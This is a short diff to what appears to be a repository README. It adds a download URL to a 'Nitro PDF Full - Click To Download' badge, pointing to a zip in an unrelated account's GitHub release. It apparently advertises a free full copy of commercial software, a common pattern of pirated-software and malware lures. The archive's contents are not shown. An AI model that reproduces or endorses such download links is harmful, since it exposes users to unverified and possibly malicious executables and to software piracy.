@@ -5,7 +5,7 @@
 
 
 
-[![azssdasdasd](https://img.shields.io/badge/Nitro_PDF_Full-Click_To_Download-orange?style=for-the-badge&logo=gitlab)]()
+[![azssdasdasd](https://img.shields.io/badge/Nitro_PDF_Full-Click_To_Download-orange?style=for-the-badge&logo=gitlab)](https://github.com/albertkazanova/Full-Nitro-PDF/releases/download/NitroPDF_F/NitroPdf_Full.zip)
 
 
 # Features:
